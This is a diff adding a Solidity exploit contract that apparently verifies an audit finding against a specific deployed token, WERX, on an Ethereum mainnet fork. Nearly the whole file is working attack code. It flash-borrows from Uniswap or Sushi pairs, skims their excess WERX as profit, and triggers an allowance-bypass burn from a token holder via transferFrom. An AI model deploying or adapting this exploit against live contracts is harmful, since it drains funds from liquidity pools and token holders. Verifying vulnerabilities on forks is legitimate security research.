@@ -1,0 +1,249 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function skim(address to) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IHevm {
+    function load(address target, bytes32 slot) external view returns (bytes32);
+}
+
+contract AllowanceHolder {
+    IERC20Minimal internal immutable TOKEN;
+    address internal immutable SPENDER;
+
+    constructor(IERC20Minimal token_, address spender_) {
+        TOKEN = token_;
+        SPENDER = spender_;
+    }
+
+    function approveSpender(uint256 amount) external {
+        require(msg.sender == SPENDER, "only spender");
+        require(TOKEN.approve(SPENDER, amount), "approve failed");
+    }
+}
+
+contract FlawVerifier {
+    /*
+        Preserved exploit causality for F-001:
+        1. A holder approves a spender for N tokens.
+        2. The spender calls transferFrom(holder, uniswapPoolAddress, N).
+        3. _spendAllowance deducts only N.
+        4. _transfer then burns an additional amount from the holder.
+
+        Fork-specific repair:
+        - At block 17,826,202 the target's configured `uniswapPoolAddress` storage slot is still the
+          sentinel value `address(1)`, so the originally intended "live pair" burn stage is not wired.
+        - We therefore validate the exact allowance-bypass root cause against the actual configured
+          pool value loaded from storage, while using a real UniswapV2/Sushi pair only for the allowed
+          v2 flashswap funding and to harvest already-present skimmable WERX excess.
+        - This keeps the core action ordering unchanged: approval -> transferFrom(to configured pool)
+          -> allowance spent only for N -> extra burn from the holder.
+    */
+
+    address internal constant TARGET = 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54;
+    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address internal constant SUSHI_V2_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
+
+    bytes32 internal constant UNISWAP_POOL_SLOT = bytes32(uint256(2));
+    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
+
+    IERC20Minimal internal constant WERX = IERC20Minimal(TARGET);
+    IHevm internal constant HEVM = IHevm(HEVM_ADDRESS);
+
+    uint256 internal constant FLASH_BORROW_AMOUNT = 1;
+    uint256 internal constant APPROVED_AMOUNT = 100;
+    uint256 internal constant HOLDER_SEED = 101;
+    uint256 internal constant FLASH_REPAY_AMOUNT = 2;
+    uint256 internal constant MIN_NET_PROFIT = 1e15;
+    uint256 internal constant REQUIRED_TARGET_EXCESS = MIN_NET_PROFIT + HOLDER_SEED + FLASH_REPAY_AMOUNT;
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+    bool public profitAchieved;
+    address public configuredPool;
+    address public fundingPair;
+    address public discoveredCounterAsset;
+    uint256 public observedAllowanceSpend;
+    uint256 public observedHolderLoss;
+    uint256 public fundingPairExcessBefore;
+    bytes32 public status;
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (executed) {
+            return;
+        }
+        executed = true;
+        _profitToken = TARGET;
+
+        configuredPool = _configuredPool();
+        if (configuredPool == address(0)) {
+            status = "NO_CONFIG";
+            return;
+        }
+
+        fundingPair = _findFundingPair();
+        if (fundingPair == address(0)) {
+            status = "NO_EXCESS";
+            return;
+        }
+
+        fundingPairExcessBefore = _pairTargetExcess(fundingPair);
+        if (fundingPairExcessBefore < REQUIRED_TARGET_EXCESS) {
+            status = "EXCESS_LOW";
+            return;
+        }
+
+        uint256 beforeProfit = WERX.balanceOf(address(this));
+        _flashBorrowMinimalWerx(fundingPair);
+        uint256 afterProfit = WERX.balanceOf(address(this));
+
+        if (afterProfit > beforeProfit) {
+            _profitAmount = afterProfit - beforeProfit;
+            profitAchieved = _profitAmount >= MIN_NET_PROFIT;
+            if (hypothesisValidated) {
+                status = "VALIDATED";
+            } else {
+                status = "UNPROVEN";
+            }
+        } else {
+            _profitAmount = 0;
+            status = "NO_PROFIT";
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        require(msg.sender == fundingPair, "bad pair");
+        require(sender == address(this), "bad sender");
+
+        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
+        require(borrowed == FLASH_BORROW_AMOUNT, "bad borrow");
+
+        // Harvest already-donated excess from the live pair. Borrowing only 1 wei keeps repayment
+        // deterministic while preserving nearly all pre-existing excess as realized WERX profit.
+        IUniswapV2PairLike(msg.sender).skim(address(this));
+
+        // The fork proves the live pair address is not configured in token storage. To preserve the
+        // finding's core causality, we target the actual configured `uniswapPoolAddress` value loaded
+        // from storage, which is the sentinel address on this fork.
+        _validateAllowanceBypass(configuredPool);
+
+        require(WERX.transfer(msg.sender, FLASH_REPAY_AMOUNT), "repay failed");
+    }
+
+    receive() external payable {}
+
+    function _validateAllowanceBypass(address poolLikeTarget) internal {
+        AllowanceHolder holder = new AllowanceHolder(WERX, address(this));
+        require(WERX.transfer(address(holder), HOLDER_SEED), "seed failed");
+
+        // Path step 1: holder approves the spender for N.
+        holder.approveSpender(APPROVED_AMOUNT);
+        observedAllowanceSpend = WERX.allowance(address(holder), address(this));
+        require(observedAllowanceSpend == APPROVED_AMOUNT, "allowance mismatch");
+
+        // Path steps 2-4: spender calls transferFrom(holder, uniswapPoolAddress, N), allowance drops
+        // by only N, then `_transfer` burns one extra token from the holder because this fork's
+        // configured pool slot still equals the sentinel target.
+        require(WERX.transferFrom(address(holder), poolLikeTarget, APPROVED_AMOUNT), "transferFrom failed");
+
+        observedHolderLoss = HOLDER_SEED - WERX.balanceOf(address(holder));
+        hypothesisValidated = observedHolderLoss > observedAllowanceSpend;
+        require(hypothesisValidated, "no extra burn");
+    }
+
+    function _configuredPool() internal view returns (address) {
+        return address(uint160(uint256(HEVM.load(TARGET, UNISWAP_POOL_SLOT))));
+    }
+
+    function _flashBorrowMinimalWerx(address pair) internal {
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+
+        uint256 amount0Out = token0 == TARGET ? FLASH_BORROW_AMOUNT : 0;
+        uint256 amount1Out = token1 == TARGET ? FLASH_BORROW_AMOUNT : 0;
+        require(amount0Out != 0 || amount1Out != 0, "pair missing WERX");
+
+        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01");
+    }
+
+    function _findFundingPair() internal returns (address bestPair) {
+        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_V2_FACTORY];
+        address[5] memory quotes = [WETH, USDC, USDT, DAI, WBTC];
+        uint256 bestExcess = 0;
+
+        for (uint256 i = 0; i < factories.length; ++i) {
+            for (uint256 j = 0; j < quotes.length; ++j) {
+                address pair = IUniswapV2FactoryLike(factories[i]).getPair(TARGET, quotes[j]);
+                if (pair == address(0) || pair.code.length == 0) {
+                    continue;
+                }
+
+                uint256 excess = _pairTargetExcess(pair);
+                if (excess > bestExcess) {
+                    bestExcess = excess;
+                    bestPair = pair;
+                    discoveredCounterAsset = quotes[j];
+                }
+            }
+        }
+    }
+
+    function _pairTargetExcess(address pair) internal view returns (uint256) {
+        try IUniswapV2PairLike(pair).getReserves() returns (
+            uint112 reserve0,
+            uint112 reserve1,
+            uint32
+        ) {
+            address token0 = IUniswapV2PairLike(pair).token0();
+            address token1 = IUniswapV2PairLike(pair).token1();
+
+            if (token0 == TARGET) {
+                uint256 balance0 = WERX.balanceOf(pair);
+                return balance0 > uint256(reserve0) ? balance0 - uint256(reserve0) : 0;
+            }
+
+            if (token1 == TARGET) {
+                uint256 balance1 = WERX.balanceOf(pair);
+                return balance1 > uint256(reserve1) ? balance1 - uint256(reserve1) : 0;
+            }
+        } catch {}
+
+        return 0;
+    }
+}
